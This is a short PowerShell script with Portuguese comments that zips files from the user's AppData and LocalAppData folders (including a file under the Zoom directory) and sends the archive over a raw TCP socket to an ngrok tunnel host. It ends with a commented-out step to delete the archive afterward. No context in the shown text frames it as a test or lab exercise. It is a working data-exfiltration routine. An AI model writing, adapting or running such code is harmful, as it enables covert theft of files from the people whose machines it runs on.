# Bases
$roaming = $env:APPDATA
$local   = $env:LOCALAPPDATA
$zip = "$env:TEMP\envio.zip"

# Cria ZIP
if (Test-Path $zip) { Remove-Item $zip -Force }

Compress-Archive `
    "$roaming\mano.txt", `
    "$local\Zoom\installer.txt" `
    -DestinationPath $zip -Force

# Envia via TCP
$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io",11498)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes($zip)
$s.Write($b,0,$b.Length)
$s.Flush()
$s.Close()
$c.Close()

# (opcional) apagar depois
# Remove-Item $zip -Force
